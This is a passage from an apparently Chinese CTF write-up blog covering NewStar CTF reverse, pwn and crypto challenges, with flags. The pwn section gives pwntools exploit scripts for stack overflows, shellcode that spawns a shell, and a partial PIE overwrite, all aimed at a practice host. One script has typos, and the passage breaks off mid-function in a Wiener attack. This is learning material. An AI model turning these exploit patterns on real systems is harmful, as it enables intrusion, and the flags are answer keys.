input_recovered<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    input_recovered<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>i <span class="token operator">^</span> input_recovered<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> input_recovered<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;Y0u_kn0w_what_1s_PE_File_F0rmat&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h2><p>activtiy是提供用户界面，可以使用户交互的，程序中有个flag activtiy但是主界面没有什么地方能够调用这个activity的搜了一下可以用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">am start <span class="token parameter variable">-n</span> com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个命令adb shell的命令来调用一个应用的activtiy</p>
<p>这边是flag activity的关键逻辑，可以反编译然后将10000改成1就好了。但是折腾了好久apktools反编译打包有问题，还有签名那，后面找了一个安卓修改大师破解版，一键打包签名就正常了</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                textView<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">FlagActivity</span><span class="token punctuation">.</span>access$<span class="token function">004</span><span class="token punctuation">(</span><span class="token class-name">FlagActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">FlagActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>cnt <span class="token operator">>=</span> <span class="token number">10000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token class-name">FlagActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">,</span> editText<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;Act1v1ty_!s_so00oo0o_Impor#an#&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>有个backdoor函数，溢出后跳过去就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2text'</span><span class="token punctuation">)</span>
<span class="token comment">#</span>
ip <span class="token operator">=</span> <span class="token string">"node4.buuoj.cn"</span>
port <span class="token operator">=</span> <span class="token number">29750</span>

<span class="token comment"># p = process()</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>


line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># Welcome to NewStar CTF!!</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># Show me your magic</span>


backdoor_address <span class="token operator">=</span> <span class="token number">0x4011FB</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
paylaod <span class="token operator">+=</span> backdoor_adress


p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>shellcode输入后会直接jmp到buf那，所以只需要把shellcode输入就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ezshellcode'</span><span class="token punctuation">)</span>
<span class="token comment">#</span>
ip <span class="token operator">=</span> <span class="token string">"node4.buuoj.cn"</span>
port <span class="token operator">=</span> <span class="token number">29750</span>

<span class="token comment"># p = process()</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>


line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># Welcome to NewStar CTF!!</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># Show me your magic</span>


shellcode  <span class="token operator">=</span>  asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> shellcode


p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h2><p>选1进商店买到没钱然后选3 -50后，uint溢出就能直接买&#x2F;bin sh了</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;8b42af7c-c695-489a-ad79-1bff9d84f52c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><p>咱是笨蛋，习惯性看ida中的函数视图了，没注意到关键函数下面有个用_asm{}写的直接system bin sh的块，pie的话低三位16进制的地址是不变的，所以只需要在return位置那填充低位地址，根据原有的高位地址，就能跳过去。</p>
<pre class="line-numbers language-none"><code class="language-none">.text:0000000000001264 ; __unwind &#123;
.text:0000000000001264                 endbr64
.text:0000000000001268                 push    rbp
.text:0000000000001269                 mov     rbp, rsp
.text:000000000000126C                 lea     rdi, aBinSh     ; &quot;&#x2F;bin&#x2F;sh&quot;
.text:0000000000001273                 call    _system
.text:0000000000001278                 nop
.text:0000000000001279                 pop     rbp
.text:000000000000127A                 retn
.text:000000000000127A ; &#125; &#x2F;&#x2F; starts at 1264<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./p1eee'</span><span class="token punctuation">)</span>
ip <span class="token operator">=</span> <span class="token string">"node4.buuoj.cn"</span>
port <span class="token operator">=</span> <span class="token number">26886</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># p = process()</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x6C</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;cc6d8d8e-cae4-4f5d-88b5-8ddd66f66a2c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>可以用ctypes 调用libc中的time srand rand函数，校园网好卡，去外边才打通了，要多跑几遍，随机数拼凑字符对了才可以</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29912475/article/details/130319284">https://blog.csdn.net/qq_29912475/article/details/130319284</a> </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> ctypes

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Random'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
libc <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>CDLL<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>

ip <span class="token operator">=</span> <span class="token string">"node4.buuoj.cn"</span>
port <span class="token operator">=</span> <span class="token number">25248</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># p = process()</span>

<span class="token comment">#初始化函数返回值</span>
libc<span class="token punctuation">.</span>time<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_long
libc<span class="token punctuation">.</span>srand<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">[</span>ctypes<span class="token punctuation">.</span>c_uint<span class="token punctuation">]</span>

<span class="token comment">#调用函数</span>
time_value <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_longlong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
seed <span class="token operator">=</span> libc<span class="token punctuation">.</span>time<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>time_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
rand_result <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>

line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>rand_result<span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">flag&#123;f5be13ec-f7f0-4dea-ab64-31470e102fbf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p>可以用这个解密 <a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a></p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h2><p>想到偏移量，凯撒密码，<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/caesar">https://ctf.bugku.com/tool/caesar</a> 偏移5解出flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;ca3s4r&#39;s_c1pher_i5_v4ry_3azy&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h2><p>栅栏密码 <a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a> 解密</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;reordering_the_plaintext#686f8c03&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">vigenere_decrypt_single</span><span class="token punctuation">(</span>char_ciphertext<span class="token punctuation">,</span> char_plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    alphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span>
    index_ciphertext <span class="token operator">=</span> alphabet<span class="token punctuation">.</span>index<span class="token punctuation">(</span>char_ciphertext<span class="token punctuation">)</span>
    index_plaintext <span class="token operator">=</span> alphabet<span class="token punctuation">.</span>index<span class="token punctuation">(</span>char_plaintext<span class="token punctuation">)</span>
    index_key <span class="token operator">=</span> <span class="token punctuation">(</span>index_ciphertext <span class="token operator">-</span> index_plaintext<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
    <span class="token keyword">return</span> alphabet<span class="token punctuation">[</span>index_key<span class="token punctuation">]</span>

ciphertext <span class="token operator">=</span> <span class="token string">"pqcq"</span>
plaintext <span class="token operator">=</span> <span class="token string">"flag"</span>


key <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>vigenere_decrypt_single<span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跑出来是kfck, 猜测是kfckfc，用kfc解密后拿到flag</p>
<p>flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}</p>
<h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>Q&amp;A:</p>
<p>1选择N &#x3D; p * q是因为N有能够唯一分解成p q两个因子的特性</p>
<p>2为什么φ(p) &#x3D;(p-1)？</p>
<p>是因为p是素数这个特性，所以和p互质的数是p-1个</p>
<p>3 ed≡1(mod φ(N)) 这个是根据扩欧几里得推导出来的</p>
<p>扩欧几里得的定义是 能找到整数x ，y 使得ax + by &#x3D; gcd(a,b)</p>
<p>e和d是互质的，所以使得 ex + φ(N)y &#x3D; 1 然后φ(N)y &#x3D; 0，所以就算出ed≡1(mod φ(N))  </p>
<p><a target="_blank" rel="noopener" href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a> 可以用这个在线的网站分解n，然后求phi n，通过phi n求e的逆元d解密</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

<span class="token comment"># 计算phi n</span>
<span class="token keyword">def</span> <span class="token function">calculate_phi_n</span><span class="token punctuation">(</span>factors<span class="token punctuation">)</span><span class="token punctuation">:</span>
    phi_n <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> p <span class="token keyword">in</span> factors<span class="token punctuation">:</span>
        phi_n <span class="token operator">*=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> phi_n

<span class="token comment"># 求逆元</span>
<span class="token keyword">def</span> <span class="token function">modinv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> extended_gcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span>
    <span class="token keyword">return</span> x <span class="token operator">%</span> m

<span class="token keyword">def</span> <span class="token function">extended_gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> extended_gcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rsa_decrypt</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> factors<span class="token punctuation">)</span><span class="token punctuation">:</span>
    phi_n <span class="token operator">=</span> calculate_phi_n<span class="token punctuation">(</span>factors<span class="token punctuation">)</span>
    d <span class="token operator">=</span> modinv<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span>
    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

n <span class="token operator">=</span> <span class="token number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
c <span class="token operator">=</span> <span class="token number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span>
factors <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">2217990919</span><span class="token punctuation">,</span> <span class="token number">2338725373</span><span class="token punctuation">,</span> <span class="token number">2370292207</span><span class="token punctuation">,</span> <span class="token number">2463878387</span><span class="token punctuation">,</span> <span class="token number">2706073949</span><span class="token punctuation">,</span>
    <span class="token number">2794985117</span><span class="token punctuation">,</span> <span class="token number">2804303069</span><span class="token punctuation">,</span> <span class="token number">2923072267</span><span class="token punctuation">,</span> <span class="token number">2970591037</span><span class="token punctuation">,</span> <span class="token number">3207148519</span><span class="token punctuation">,</span>
    <span class="token number">3654864131</span><span class="token punctuation">,</span> <span class="token number">3831680819</span><span class="token punctuation">,</span> <span class="token number">3939901243</span><span class="token punctuation">,</span> <span class="token number">4093178561</span><span class="token punctuation">,</span> <span class="token number">4278428893</span>
<span class="token punctuation">]</span>

decrypted_message <span class="token operator">=</span> rsa_decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> factors<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>decrypted_message<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><p>part1 和part2有&#x3D;号，然后part1是大小写字母加数字，2是纯大写字母，应该是base64和32.</p>
<p>part3搜了好久，在这篇文章中找到了<a target="_blank" rel="noopener" href="https://blog.csdn.net/Retrovich/article/details/90313591">https://blog.csdn.net/Retrovich/article/details/90313591</a> 是uuencode编码，在线解密拼接得到flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>后面去看了一下群里的crypto入门的文档，发现里面就有uuencode的识别方法</p>
<h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>Michael J. Wiener 觉得很赞 这个搜了一下，有一种针对small d的攻击方式叫维纳攻击</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rreally/article/details/111092579">https://blog.csdn.net/rreally/article/details/111092579</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

<span class="token keyword">def</span> <span class="token function">transform</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 使用辗转相处将分数 x/y 转为连分数的形式</span>
    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">while</span> y<span class="token punctuation">:</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x <span class="token operator">//</span> y<span class="token punctuation">)</span>
        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> x <span class="token operator">%</span> y
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">continued_fraction</span><span class="token punctuation">(</span>sub_res<span class="token punctuation">)</span><span class="token punctuation">:</span>
    numerator<span class="token punctuation">,</span> denominator <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> sub_res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token comment"># 从sublist的后面往前循环</span>
        denominator<span class="token punctuation">,</span> numerator <span class="token operator">=</span> numerator<span class="token punctuation">,</span> i <span class="token operator">*</span> numerator <span class="token operator">+</span> denominator
    <span class="token keyword">return</span> denominator<span class="token punctuation">,</span> numerator  <span class="token comment"># 得到渐进分数的分母和分子，并返回</span>

<span class="token comment"># 求解每个渐进分数</span>
<span class="token keyword">def</span> <span class="token function">sub_fraction</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> transform<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>continued_fraction<span class="token punctuation">,</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将连分数的结果逐一截取以求渐进分数</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">get_pq</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 由p+q和pq的值通过维达定理来求解p和q</span>
    par <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>b <span class="token operator">*</span> b <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> a <span class="token operator">*</span> c<span class="token punctuation">)</span>  <span class="token comment"># 由上述可得，开根号一定是整数，因为有解</span>
    x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">+</span> par<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">-</span> par<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span>
    <span class="token keyword">return</span> x1<span class="token punctuation">,</span> x2

<span class="token keyword">def</span> <span class="token function">wienerAttack</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
